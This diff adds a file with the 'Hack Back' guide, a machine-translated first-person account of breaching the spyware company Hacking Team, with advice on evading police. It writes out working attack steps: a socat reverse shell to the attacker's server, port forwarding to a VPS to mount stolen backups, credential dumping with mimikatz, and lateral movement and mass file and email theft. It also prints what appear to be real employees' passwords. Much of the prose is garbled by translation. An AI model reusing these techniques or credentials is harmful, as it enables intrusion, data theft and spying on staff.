@@ -1,0 +1,898 @@
+﻿         _   _            _      ____             _    _ 
+               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
+               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
+               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
+               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
+                                                 
+                                  A DIY Guide
+
+
+
+                                 ,-._,-._             
+                              _,-\  o O_/;            
+                             / ,  `     `|            
+                             | \-.,___,  /   `        
+                              \ `-.__/  /    ,.\      
+                             / `-.__.-\`   ./   \'
+                            / /|    ___\ ,/      `\
+                           ( ( |.-"`   '/\         \  `
+                            \ \/      ,,  |          \ _
+                             \|     o/o   /           \.
+                              \        , /             /
+                              ( __`;-;'__`)            \\
+                              `//'`   `||`              `\
+                             _//       ||           __   _   _ _____   __
+                     .-"-._,(__)     .(__).-""-.      | | | | |_   _| |
+                    /          \    /           \     | | |_| | | |   |
+                    \          /    \           /     | |  _  | | |   |
+                     `'-------`      `--------'`    __| |_| |_| |_|   |__
+                               #antisec
+
+
+
+ -  [1  - 简介] ------------------------------------------- ---------------
+
+你会注意到语言的变化从上一版[1]。的
+英语世界已经有很多书，讲座，指南，和
+关于黑客的信息。在那个世界上，有很多黑客比我更好，
+但他们滥用自己的才能为“国防”承包商工作，为智力
+机构，保护银行和公司，以及捍卫现状。
+黑客文化在美国出生，作为反文化，但只是起源
+保持在其美学 - 其余已被同化。至少他们可以
+穿T恤，染发蓝色，使用他们的黑客名字，感觉像
+反叛者，当他们为人工作。
+
+你曾经偷偷到办公室泄露文件[2]。你曾经需要
+一把枪抢银行。现在你可以从床上用笔记本电脑在手[3] [4]。
+就像CNT说在Gamma Group黑客之后：“让我们向前迈进一步
+新形式的斗争“[5]。黑客是一个强大的工具，让我们学习和战斗！
+
+[1] [http://pastebin.com/raw.php?i=cryvK4jb](http://pastebin.com/raw.php?i=cryvK4jb)
+
+[2] [https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI](https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI)
+
+[3] [http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-150921083914167.html](http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-150921083914167.html)
+
+[4] [https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf](http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-150921083914167.html)
+
+[5] [http://madrid.cnt.es/noticia/​​consideraciones-sobre-el-ataque-informatico-a-gamma-group](http://madrid.cnt.es/noticia/​​consideraciones-sobre-el-ataque-informatico-a-gamma-group)
+
+
+ -  [2  - 黑客团队] ------------------------------------------ ----------------
+
+黑客团队是一个帮助政府黑客和间谍的公司
+记者，活动家，政治反对派和对其权力的其他威胁
+[1] [2] [3] [4] [5] [6] [7] [8] [9] [10] [11]。偶尔，对实际的罪犯
+和恐怖分子[12]。 CEO Vincenzetti，喜欢结束他的电子邮件
+法西斯口号“boia chi molla”。更正确的说法是“boia chi vende
+RCS“，他们还声称拥有技术来解决Tor提出的”问题“
+和暗网[13]。但看到我仍然是自由的，我有我的怀疑
+其有效性。
+
+[1] http://www.animalpolitico.com/2015/07/el-gobierno-de-puebla-uso-el-software-de-hacking-team-para-espionaje-politico/
+[2] http://www.prensa.com/politica/claves-entender-Hacking-Team-Panama_0_4251324994.html
+[3] http://www.24-horas.mx/ecuador-espio-con-hacking-team-a-opositor-carlos-figueroa/
+[4] https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/
+[5] https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/
+[6] https://citizenlab.org/2015/03/hacking-team-reloaded-us-based-ethiopian-journalists-targeted-spyware/
+[7] http://focusecuador.net/2015/07/08/hacking-team-rodas-paez-tiban-torres-son-espiados-en-ecuador/
+[8] http://www.pri.org/stories/2015-07-08/these-ethiopian-journalists-exile-hacking-team-revelations-are-personal
+[9] https://theintercept.com/2015/07/07/leaked-documents-confirm-hacking-team-sells-spyware-repressive-countries/
+[10] http://www.wired.com/2013/06/spy-tool-sold-to-governments/
+[11] http://www.theregister.co.uk/2015/07/13/hacking_team_vietnam_apt/
+[12] http://www.ilmessaggero.it/primopiano/cronaca/yara_bossetti_hacking_team-1588888.html
+[13] http://motherboard.vice.com/en_ca/read/hacking-team-founder-hey-fbi-we-can-help-you-crack-the-dark-web
+
+
+ -  [3  - 保持安全] ---------------------------------------- -----------
+
+不幸的是，我们的世界是倒退的。你通过做坏事，走向富有
+到监狱做好。幸运的是，感谢人们的辛勤工作
+Tor项目[1]，你可以通过几个简单的避免去监狱
+预防措施：
+
+1）加密您的硬盘[2]
+
+   我想当警察到达抓住你的电脑，这意味着你
+   已经犯了很多错误，但最好是安全。
+
+2）使用通过Tor路由的所有流量的虚拟机
+
+   这完成了两件事。首先，所有的流量都通过匿名
+   Tor。第二，保持你的个人生活和你的黑客分开
+   计算机可以帮助您避免意外混合。
+
+   您可以使用像Whonix [3]，Tails [4]，Qubes TorVM [5]或
+   东西定制[6]。这里[7]详细比较。
+
+3）（可选）请勿直接连接到Tor
+   
+   Tor不是灵丹妙药。他们可以关联你连接到Tor的时间
+   与你的黑客处理是活跃的时代。还有，已经
+   成功攻击Tor [8]。你可以使用其他连接到Tor
+   人民的wifi。 Wifislax [9]是一个linux发行版，有很多工具
+   破解WiFi。另一个选择是连接到VPN或网桥节点[10]
+   在Tor之前，但是这不太安全，因为他们仍然可以相关联
+   黑客的活动与你家的互联网活动（这是用作
+   证据反对Jeremy Hammond [11]）。
+
+   现实是，虽然Tor不是完美的，它的工作相当不错。当我
+   是年轻和鲁莽，我做了很多东西没有任何保护（我是
+   提到黑客），除了Tor，警察试图最难的
+   调查，我从来没有任何问题。
+
+[1] https://www.torproject.org/
+[2] https://info.securityinabox.org/es/chapter-4
+[3] https://www.whonix.org/
+[4] https://tails.boum.org/
+[5] https://www.qubes-os.org/doc/privacy/torvm/
+[6] https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy
+[7] https://www.whonix.org/wiki/Comparison_with_Others
+[8] https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack/
+[9] http://www.wifislax.com/
+[10] https://www.torproject.org/docs/bridges.html.en
+[11] http://www.documentcloud.org/documents/1342115-timeline-correlation-jeremy-hammond-and-anarchaos.html
+
+
+---- [3.1  - 基础设施] ----------------------------------------- -----------
+
+我不直接从Tor出口节点攻击。他们在黑名单上，他们
+慢，他们不能接收连接回。 Tor保护我的匿名，而我
+连接到我用来破解的基础设施，其中包括：
+
+1）域名
+
+   用于C＆C地址，以及用于确保出口的DNS隧道。
+
+2）稳定的服务器
+
+   对于用作C＆C服务器，接收连接后壳，发起攻击，
+   并存储战利品。
+
+3）黑客服务器
+
+   用作枢轴以隐藏稳定服务器的IP地址。和为
+   当我想要一个快速连接而不用转动时，例如扫描端口，
+   扫描整个互联网，用sqli下载数据库等。
+
+显然，你必须使用匿名支付方式，比如比特币（如果是的话
+仔细使用）。
+
+
+---- [3.2  - 署名] ----------------------------------------- --------------
+
+在新闻中，我们经常看到攻击追溯到政府支持的黑客攻击
+组（“APT”），因为他们重复使用相同的工具，保持不变
+足迹，甚至使用相同的基础设施（域，电子邮件等）。
+他们是疏忽的，因为他们可以黑客没有法律后果。
+
+我不想让警察的工作更容易通过联系我的黑客
+黑客团队与我做过的其他黑客或我在我的日常使用的名字
+工作作为一个blackhat黑客。所以，我使用了新的服务器和域名，注册
+与新的电子邮件，并支付与新的比特币地址。此外，我只使用
+公共可用的工具，或我专门为之写的东西
+这次攻击，我改​​变了我的方式做一些事情不离开我的平常
+法医足迹。
+
+
+ -  [4  - 信息收集] ------------------------------------------ -------
+
+虽然它可以是单调乏味，这个阶段是非常重要的，因为更大
+攻击面，更容易在它的某处找到一个洞。
+
+
+---- [4.1  - 技术资料] ---------------------------------------- -----
+
+一些工具和技术是：
+
+1）Google
+
+   很多有趣的事情可以找到一些很好的选择搜索
+   查询。例如，DPR的身份[1]。 Google黑客的圣经
+   是“Google Hacking for Penetration Testers”的书。你可以找到一个短
+   西班牙语摘要[2]。
+
+2）子域枚举
+
+   通常，公司的主要网站由第三方托管，你会发现
+   公司的实际IP范围感谢子域名如mx.company.com或
+   ns1.company.com。此外，有时有些东西不应该暴露
+   在“隐藏”子域中。用于发现域和子域的有用工具
+   是激烈的[3]，哈斯特[4]和重新组合[5]。
+
+3）Whois查找和反向查找
+
+   使用来自域或IP范围的whois信息的反向查找
+   的公司，你可以找到其他域和IP范围。我所知道的，
+   没有免费的方式来做反向查找除了google“hack”：
+   
+   “via della moscova 13”site：www.findip-address.com
+   “via della moscova 13”网站：domaintools.com
+
+4）端口扫描和指纹
+
+   与其他技术不同，这与公司的服务器。一世
+   包括它在这一节，因为它不是一个攻击，它只是
+   信息收集。公司的IDS可能会生成警报，但是您
+   不必担心，因为整个互联网是不断扫描。
+
+   对于扫描，nmap [6]是精确的，可以指纹的大多数
+   服务发现。对于IP范围非常大的公司，zmap [7]或
+   masscan [8]是快速的。 WhatWeb [9]或BlindElephant [10]可以指纹网
+   网站。
+
+[1] http://www.nytimes.com/2015/12/27/business/dealbook/the-unsung-tax-agent-who-put-a-face-on-the-silk-road.html
+[2] http://web.archive.org/web/20140610083726/http://www.soulblack.com.ar/repo/papers/hackeando_con_google.pdf
+[3] http://ha.ckers.org/fierce/
+[4] https://github.com/laramies/theHarvester
+[5] https://bitbucket.org/LaNMaSteR53/recon-ng
+[6] https://nmap.org/
+[7] https://zmap.io/
+[8] https://github.com/robertdavidgraham/masscan
+[9] http://www.morningstarsecurity.com/research/whatweb
+[10] http://blindelephant.sourceforge.net/
+
+
+---- [4.2  - 社会信息] ---------------------------------------- --------
+
+对于社会工程，有用的信息有用的员工，
+他们的角色，联系信息，操作系统，浏览器，插件，
+软件等。一些资源是：
+
+1）Google
+
+   在这里，它是最有用的工具。
+
+2）记录和重新记录
+
+   我已经在上一节中提到过，但他们有很多
+   功能。他们可以快速找到很多信息
+   自动。这是值得阅读他们的所有文档。
+
+3）LinkedIn
+
+   有关员工的大量信息可以在这里找到。公司的
+   招聘人员最有可能接受您的连接请求。
+
+4）Data.com
+
+   以前称为拼图。他们有许多联系信息
+   雇员。
+
+5）文件元数据
+
+   有关员工及其系统的大量信息，请参见
+   公司已发布的文件的元数据。有用的工具找到
+   公司网站上的文件和提取的元数据是metagoofil
+   [1]和FOCA [2]。
+
+[1] https://github.com/laramies/metagoofil
+[2] https://www.elevenpaths.com/es/labstools/foca-2/index.html
+
+
+ -  [5  - 进入网络] ----------------------------------------- ---------
+
+有各种方法获得立足点。自从我使用的方法
+黑客团队是不常见的，比通常需要的更多的工作，我会的
+谈一谈两种最常见的方法，我建议先尝试。
+
+
+---- [5.1  - 社会工程] ---------------------------------------- --------
+
+社会工程，特别是鱼叉钓鱼，负责
+大多数黑客这些天。关于西班牙语的介绍，见[1]。对于
+更多的信息在英语，见[2]（第三部分，“目标攻击”）。对于
+关于过去几代人的社会工程探索的有趣故事，见
+[3]。我不想试图刺探phish黑客团队，作为他们的整个业务
+正在帮助政府钓鱼他们的对手，所以他们会更多
+可能识别和调查鱼叉钓鱼尝试。
+
+[1] http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html
+[2] http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/
+[3] http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf
+
+
+---- [5.2  - 购买权限] ---------------------------------------- -------------
+
+感谢俄罗斯人和他们的开发包，交通卖家和
+机器人牧民，许多公司已经在他们的计算机
+网络。几乎所有的财富500强，有他们巨大的网络，有一些
+机器人已经在里面。但是，Hacking Team是一家非常小的公司，大多数
+的员工是信息安全专家，所以他们很少有机会
+已经受损。
+
+
+---- [5.3  - 技术开发] ---------------------------------------- ----
+
+在Gamma集团攻击之后，我描述了一个搜索的过程
+漏洞[1]。黑客团队有一个公共IP范围：
+核磁共振谱：93.62.139.32-93.62.139.47
+descr：HT公有子网
+
+黑客团队很少暴露在互联网。例如，不同
+Gamma集团，他们的客户支持网站需要客户证书
+连接。他们是他们的主要网站（Joomscan的Joomla博客
+[2]没有发现什么严重），一个邮件服务器，几个路由器，两个VPN
+设备和垃圾邮件过滤设备。所以，我有三个选择：寻找
+一个0day在Joomla，寻找一个0day在postfix，或寻找一个0day在其中之一
+嵌入式设备。嵌入式设备中的0day似乎是最简单的选项，
+而经过两个星期的逆向工程，我得到了一个远程的root漏洞。
+因为漏洞还没有打补丁，我不会给更多
+详细信息，但是有关查找这些类型的漏洞的更多信息，
+见[3]和[4]。
+
+[1] http://pastebin.com/raw.php?i=cryvK4jb
+[2] http://sourceforge.net/projects/joomscan/
+[3] http://www.devttys0.com/
+[4] https://docs.google.com/presentation/d/1-mtBSka1ktdh8RHxo2Ft0oNNlIp7WmDA2z9zzHpon8A
+
+
+ -  [6  - 准备] ------------------------------------------ -----------------
+
+我在使用对黑客团队的漏洞之前做了很多工作和测试。
+我写了一个后退的固件，并编译了各种后开发工具
+用于嵌入式设备。后门用于保护漏洞。使用
+只利用一次，然后通过后门返回使得更难
+识别和修补漏洞。
+
+我准备的开发工具是：
+
+1）busybox
+
+   对于系统没有的所有标准Unix实用程序。
+
+2）nmap
+
+   扫描和指纹黑客团队的内部网络。
+
+3）Responder.py
+
+   最有用的工具，攻击Windows网络时，你有权限访问
+   内部网络，但没有域用户。
+
+4）Python
+
+   执行Responder.py
+
+5）tcpdump
+
+   嗅闻交通。
+
+6）dsniff
+
+   用于从纯文本协议（如ftp和for）中嗅探密码
+   arpspoofing。我想使用ettercap，由Hacking Team自己的ALoR写的
+   和NaGA，但它很难为系统编译。
+
+7）socat
+
+   对于一个舒适的壳与pty：
+   my_server：socat文件：`tty`，raw，echo = 0 tcp-listen：my_port
+   hacked box：socat exec：'bash -li'，pty，stderr，setsid，sigint，sane \
+tcp：my_server：my_port
+
+   和有用的很多，它是一个网络瑞士军刀。看到
+   示例部分。
+
+8）屏幕
+
+   像pty的壳，这不是真的有必要，但我想感觉
+   在家里在黑客团队的网络。
+
+9）SOCKS代理服务器
+
+   使用代理链，以便能够从任何地方访问其本地网络
+   程序。
+
+10）tgcd
+
+   对于转发端口，如SOCKS服务器，通过防火墙。
+
+[1] https://www.busybox.net/
+[2] https://nmap.org/
+[3] https://github.com/SpiderLabs/Responder
+[4] https://github.com/bendmorris/static-python
+[5] http://www.tcpdump.org/
+[6] http://www.monkey.org/~dugsong/dsniff/
+[7] http://www.dest-unreach.org/socat/
+[8] https://www.gnu.org/software/screen/
+[9] http：//average-coder.blogspot.com/2011/09/simple-socks5-server-in-c.html
+[10] http://tgcd.sourceforge.net/
+
+
+可能发生的最糟糕的事情将是我的后门或后开发
+工具使系统不稳定并导致员工调查。所以我
+花了一个星期测试我的漏洞利用，后门和后开发工具
+其他脆弱公司的网络进入黑客团队的网络。
+
+
+ -  [7  - 看和听] ----------------------------------------- -------------
+
+现在在他们的内部网络，我想看看周围和思考
+关于我的下一步。我在分析模式下启动Responder.py（-A来监听
+没有发送有毒的反应），并用nmap做了一个慢扫描。
+
+
+ -  [8  -  NoSQL数据库] ------------------------------------------ -------------
+
+NoSQL，或者NoAuthentication，一直是一个巨大的礼物给黑客
+社区[1]。只是当我担心，他们最终打补丁的所有
+MySQL [2] [3] [4] [5]中的认证绕过错误，新的数据库进来了
+风格，缺乏认证的设计。 Nmap发现了一些在Hacking Team的
+内部网络：
+
+27017 / tcp open mongodb MongoDB 2.6.5
+| mongodb数据库：
+| ok = 1
+| totalSizeMb = 47547
+| totalSize = 49856643072
+... ...
+| _ version = 2.6.5
+
+27017 / tcp open mongodb MongoDB 2.6.5
+| mongodb数据库：
+| ok = 1
+| totalSizeMb = 31987
+| totalSize = 33540800512
+|数据库
+... ...
+| _ version = 2.6.5
+
+它们是RCS测试实例的数据库。 RCS记录的音频
+与GridFS存储在MongoDB中。 torrent [6]中的音频文件夹来了
+由此。他们在监视自己没有意义。
+
+[1] https://www.shodan.io/search?query=product%3Amongodb
+[2] https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql
+[3] http://archives.neohapsis.com/archives/vulnwatch/2004-q3/0001.html
+[4] http://downloads.securityfocus.com/vulnerabilities/exploits/hoagie_mysql.c
+[5] http://archives.neohapsis.com/archives/bugtraq/2000-02/0053.html
+[6] https://ht.transparencytoolkit.org/audio/
+
+
+ -  [9  - 交叉电缆] ------------------------------------------ --------------
+
+虽然它是很有趣的收听录音，看到黑客的网络摄像头图像
+团队开发他们的恶意软件，这不是很有用。他们不安全的备份
+是打开他们的门的脆弱性。根据他们
+文档[1]，他们的iSCSI设备应该在一个单独的
+网络，但是nmap发现了一些在他们的子网192.168.1.200/24：
+
+ht-synology.hackingteam.local的nmap扫描报告（192.168.200.66）
+... ...
+3260 / tcp open iscsi？
+| iscsi-info：
+|目标：iqn.2000-01.com.synology：ht-synology.name
+|地址：192.168.200.66:3260,0
+| _验证：不需要验证
+
+nmap扫描报告synology-backup.hackingteam.local（192.168.200.72）
+... ...
+3260 / tcp open iscsi？
+| iscsi-info：
+|目标：iqn.2000-01.com.synology：synology-backup.name
+|地址：10.0.1.72:3260,0
+|地址：192.168.200.72:3260,0
+| _验证：不需要验证
+
+iSCSI需要一个内核模块，它很难编译
+嵌入式系统。我转发了端口，以便我可以从VPS安装：
+
+VPS：tgcd -L -p 3260 -q 42838
+嵌入式系统：tgcd -C -s ​​192.168.200.72:3260 -c VPS_IP：42838
+
+VPS：iscsiadm -m discovery -t sendtargets -p 127.0.0.1
+
+现在iSCSI找到名称iqn.2000-01.com.synology，但有安装它的问题
+因为它认为它的IP是192.168.200.72而不是127.0.0.1
+
+我解决的方式是：
+iptables -t nat -A OUTPUT -d 192.168.200.72 -j DNAT --to-destination 127.0.0.1
+
+现在，后：
+iscsiadm -m node --targetname = iqn.2000-01.com.synology：synology-backup.name -p 192.168.200.72 --login
+
+...设备文件出现！我们挂载：
+vmfs-fuse -o ro / dev / sdb1 / mnt / tmp
+
+并找到各种虚拟机的备份。 Exchange服务器似乎
+最有趣。它太大太下载，但它是可能的
+远程安装它来寻找有趣的文件：
+$ losetup / dev / loop0 Exchange.hackingteam.com-flat.vmdk
+$ fdisk -l / dev / loop0
+/ dev / loop0p1 2048 1258287103 629142528 7 HPFS / NTFS / exFAT
+
+因此偏移量为2048 * 512 = 1048576
+$ losetup -o 1048576 / dev / loop1 / dev / loop0
+$ mount -o ro / dev / loop1 / mnt / exchange /
+
+现在在/ mnt / exchange / WindowsImageBackup / EXCHANGE / Backup 2014-10-14 172311
+我们找到VM的硬盘，并挂载：
+vdfuse -r -t VHD -f f0f78089-d28a-11e2-a92c-005056996a44.vhd / mnt / vhd-disk /
+mount -o loop / mnt / vhd-disk / Partition1 / mnt / part1
+
+...最后我们解开了俄罗斯娃娃，可以看到所有的文件
+旧Exchange服务器在/ mnt / part1中
+
+[1] https://ht.transparencytoolkit.org/FileServer/FileServer/Hackingteam/InfrastrutturaIT/Rete/infrastruttura%20ht.pdf
+
+
+ -  [10  - 从备份到域管理员] --------------------------------------- -   - 
+
+在备份中最感兴趣的是看到它是否有密码或散列
+可用于访问活动服务器。我使用pwdump，cachedump和
+lsadump [1]对注册表配置单元。 lsadump找到了besadmin的密码
+服务帐户：
+
+_SC_BlackBerry MDS连接服务
+0000 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...............
+0010 62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00 b.e.s.3.2.6.7.8。
+0020 21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00！！！！！...........
+
+我使用代理链[2]与嵌入式设备上的袜子服务器和
+smbclient [3]检查密码：
+proxychains smbclient'//192.168.100.51/c$'-U'hackingteam.local / besadmin％bes32678 !!!'
+
+有效！ besadmin的密码仍然有效，并且是本地管理员。一世
+使用我的代理和metasploit的psexec_psh [4]来获取一个meterpreter会话。
+然后我迁移到64位进程，运行“load kiwi”[5]，“creds_wdigest”和
+获得了一堆密码，包括域管理员：
+
+HACKINGTEAM BESAdmin bes32678！
+HACKINGTEAM管理员uu8dd8ndd12！
+HACKINGTEAM c.pozzi P4ssword <---- lol great sysadmin
+HACKINGTEAM m.romeo ioLK /（90
+HACKINGTEAM l.guerra 4luc@=.=
+哈特福德d.martinez W4tudul3sp
+HACKINGTEAM g.russo GCBr0s0705！
+HACKINGTEAM a.scarafile Cd4432996111
+HACKINGTEAM r.viscardi Ht2015！
+HACKINGTEAM a.mino A！e $$ andra
+HACKINGTEAM m.bettini Ettore＆Bella0314
+HACKINGTEAM m.luppi Blackou7
+HACKINGTEAM s.gallucci 1S9i8m4o！
+HACKINGTEAM d.milan set！dob66
+HACKINGTEAM w.furlan Blu3.B3rry！
+HACKINGTEAM d.romualdi Rd13136f @＃
+HACKINGTEAM l.invernizzi L0r3nz0123！
+HACKINGTEAM e.ciceri 2O2571＆2E
+HACKINGTEAM e.rabe erab @ 4HT！
+
+[1] https://github.com/Nohapsis/creddump7
+[2] http://proxychains.sourceforge.net/
+[3] https://www.samba.org/
+[4] http://ns2.elhacker.net/timofonica/manuales/Manual_de_Metasploit_Unleashed.pdf
+[5] https://github.com/gentilkiwi/mimikatz
+
+
+ -  [11  - 下载邮件] ----------------------------------------- --------
+
+使用域管理员密码，我可以访问电子邮件，心脏的
+公司。因为每一步我都有一个机会被发现，我
+开始下载他们的电子邮件，然后继续探索。 Powershell使
+很容易[1]。奇怪的是，我发现了一个bug，Powershell的日期处理。后
+下载电子邮件，我花了两个星期才能访问
+源代码和一切，所以我立即返回，然后下载
+新的电子邮件。服务器是意大利语，日期格式
+日月年。我用了：
+-ContentFilter {（Received -ge '05 / 06/2015'）-or（Sent -ge '05 / 06/2015'）}
+
+与New-MailboxExportRequest下载新的电子邮件（在这种情况下所有
+邮件自6月5日）。问题是它说日期是无效的如果你
+尝试一天大于12（我想是因为在美国这个月首先
+你不能有一个12岁以上的月份）。它似乎只是微软的工程师
+使用自己的语言环境测试他们的软件。
+
+[1] http://www.stevieg.org/2010/07/using-the-exchange-2010-sp1-mailbox-export-features-for-mass-exports-to-pst/
+
+
+ -  [12  - 下载文件] ------------------------------------------ ----------
+
+现在我得到域管理员，我开始使用我的下载文件共享
+代理和smbclient的-Tc选项，例如：
+
+proxychains smbclient'//192.168.1.230/FAE DiskStation'\
+    -U'HACKINGTEAM / Administrator％uu8dd8ndd12！' -Tc FAE_DiskStation.tar'*'
+
+我下载了Amministrazione，FAE DiskStation和FileServer文件夹
+像这样的洪流。
+
+
+ -  [13  - 黑客Windows域简介] ------------------------------
+
+在继续“weones culiaos”（黑客团队）的故事之前，我
+应该给一些黑客windows网络的一般知识。
+
+
+---- [13.1  - 横向运动] ---------------------------------------- ---------
+
+我将简要回顾一下用于传播的不同技术
+windows网络。远程执行的技术需要密码或
+目标上本地管理员的哈希值。到目前为止，最常见的获取方式
+这些凭据使用mimikatz [1]，特别是sekurlsa :: logonpasswords
+和sekurlsa :: msv，在您已经有管理员访问的计算机上。的
+“就地”运动的技术也需要管理特权
+（除了runas）。升级特权的最重要的工具是
+PowerUp [2]和bypassuac [3]。
+
+[1] https://adsecurity.org/?page_id=1821
+[2] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
+[3] https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1
+
+
+遥控运动：
+
+1）psexec
+
+   在窗户上横向运动的试验和真实的方法。您可以使用
+   psexec [1]，winexe [2]，metasploit的psexec_psh [3]，Powershell帝国的
+   invoke_psexec [4]或内置窗口命令“sc”[5]。为了
+   metasploit模块，powershell帝国和pth-winexe [6]，你只需要
+   哈希，而不是密码。这是最通用的方法（它的工作任何
+   windows计算机与端口445打开），但它也是最小的隐形。
+   事件类型7045“服务控制管理器”将显示在事件日志中。在
+   我的经验，没有人曾经注意到在黑客，但它有助于
+   调查员把黑客做了什么。
+
+2）WMI
+
+   最隐蔽的方法。在所有窗口上启用WMI服务
+   计算机，但除了服务器，防火墙默认阻止它。您
+   可以使用wmiexec.py [7]，pth-wmis [6]（这里是wmiexec和
+   pth-wmis [8]），Powershell帝国的invoke_wmi [9]或者windows内置
+   wmic [5]。所有除了wmic只需要散列。
+
+3）PSRemoting [10]
+
+   默认情况下禁用它，我不建议启用新协议。
+   但是，如果sysadmin已经启用它，这是非常方便，
+   特别是如果你使用powershell的一切（和你应该使用
+   powershell几乎一切，它会改变[11]与powershell 5和
+   windows 10，但现在powershell使它很容易做的一切在RAM，
+   避免AV，并留下小的占位面积）
+
+4）计划任务
+
+   您可以使用at和schtasks [5]执行远程程序。它工作在
+   相同的情况下，你可以使用psexec，它也留下了一个众所周知
+   足迹[12]。
+
+5）GPO
+
+   如果所有这些协议被防火墙禁用或阻止，一旦你
+   域管理员，可以使用GPO为用户提供登录脚本，安装msi，
+   执行计划任务[13]，或者，就像我们将看到的计算机
+   Mauro Romeo（黑客团队的系统管理员之一），使用GPO启用WMI和
+   打开防火墙。
+
+[1] https://technet.microsoft.com/en-us/sysinternals/psexec.aspx
+[2] https://sourceforge.net/projects/winexe/
+[3] https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh
+[4] http://www.powershellempire.com/?page_id=523
+[5] http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/
+[6] https://github.com/byt3bl33d3r/pth-toolkit
+[7] https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py
+[8] https://www.trustedsec.com/june-2015/no_psexec_needed/
+[9] http://www.powershellempire.com/?page_id=124
+[10] http://www.maquinasvirtuales.eu/ejecucion-remota-con-powershell/
+[11] https://adsecurity.org/?p=2277
+[12] https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems
+[13] https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/lateral_movement/new_gpo_immediate_task.py
+
+
+“到位”运动：
+
+1）令牌窃取
+
+   一旦您在计算机上具有管理员访问权限，就可以使用令牌
+   其他用户访问域中的资源。这两个工具是
+   incognito [1]和mimikatz token :: *命令[2]。
+
+2）MS14-068
+
+   您可以利用Kerberos中的验证错误来生成域
+   管理员票[3] [4] [5]。
+
+3）通过哈希
+
+   如果您有用户的哈希，但他们没有登录，您可以使用
+   sekurlsa :: pth [2]获取用户的票。
+
+4）过程注射
+
+   任何RAT都可以将自己注入其他进程。例如，迁移
+   命令在meterpreter和pupy [6]，或psinject [7]命令in
+   权力帝国。你可以注入到有令牌的进程
+   想。
+
+5）runas
+
+   这有时非常有用，因为它不需要管理员权限。
+   该命令是Windows的一部分，但如果您没有GUI，您可以使用
+   powershell [8]。
+
+[1] https://www.indetectables.net/viewtopic.php?p=211165
+[2] https://adsecurity.org/?page_id=1821
+[3] https://github.com/bidord/pykek
+[4] https://adsecurity.org/?p=676
+[5] http://www.hackplayers.com/2014/12/CVE-2014-6324-como-validarse-con-cualquier-usuario-como-admin.html
+[6] https://github.com/n1nj4sec/pupy
+[7] http://www.powershellempire.com/?page_id=273
+[8] https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1
+
+
+---- [13.2  - 持续] ----------------------------------------- -------------
+
+一旦你有权限，你想保留它。真的，坚持只是一个
+挑战的混蛋如黑客团队谁瞄准活动家和其他
+个人。要破解公司，持久性是不需要的，因为公司从来没有
+睡觉。我总是使用Duqu 2风格的“持久性”，在一对夫妇的RAM中执行
+高正常时间服务器。在他们都同时重新启动的机会，
+我有密码和金票[1]作为备份访问。您可以阅读更多
+关于窗口中持久化的不同技术[2] [3] [4]。但
+对于黑客公司，它不需要，它增加了检测的风险。
+
+[1] http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/
+[2] http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/
+[3] http://www.hexacorn.com/blog/category/autostart-persistence/
+[4] https://blog.netspi.com/tag/persistence/
+
+
+---- [13.3  - 内部侦察] ---------------------------------------- -   - 
+
+现在理解Windows网络的最佳工具是Powerview [1]。
+值得阅读它的作者[2]写的一切，特别是[3]，[4]
+[5]和[6]。 Powershell本身也很强大[7]。因为还有
+许多windows 2000和2003服务器没有powershell，你也要学习
+the old school [8], with programs like netview.exe [9] or the windows builtin
+"net view". Other techniques that I like are:
+
+1）下载文件名列表
+
+   使用域管理员帐户，您可以下载所有文件名的列表
+   具有powerview的网络：
+
+   Invoke-ShareFinderThreaded -ExcludedShares IPC $，PRINT $，ADMIN $ |
+   select-string'^（。*）\ t-'| ％{dir -recurse $ _。Matches [0] .Groups [1] |
+   选择fullname | out-file -append files.txt}
+
+   以后，你可以随时阅读它，并选择下载哪些文件。
+
+2）阅读电子邮件
+
+   正如我们已经看到的，你可以下载带有powershell的电子邮件，它有一个
+   很多有用的信息。
+
+3）读取共享点
+
+   这是另一个地方，许多企业存储了很多重要的
+   信息。它也可以用powershell [10]下载。
+
+4）Active Directory [11]
+
+   它有很多关于用户和计算机的有用信息。没有
+   域管理员，你可以已经得到了很多信息与powerview和其他
+   工具[12]。获得域管理后，您应该导出所有的AD
+   信息与csvde或其他工具。
+
+5）间谍的员工
+
+   我最喜欢的爱好之一是狩猎系统管理员。间谍基督教Pozzi
+   （黑客团队的系统管理员之一）给了我访问Nagios服务器
+   给我访问了rete sviluppo（开发网络的源码
+   RCS的代码）。与Get-Keystrokes和简单的组合
+   从PowerSploit的Get-TimedScreenshot [13]，从Nishang的Ex-Exfiltration
+   [14]和GPO，你可以窥探任何员工，甚至整个域。
+
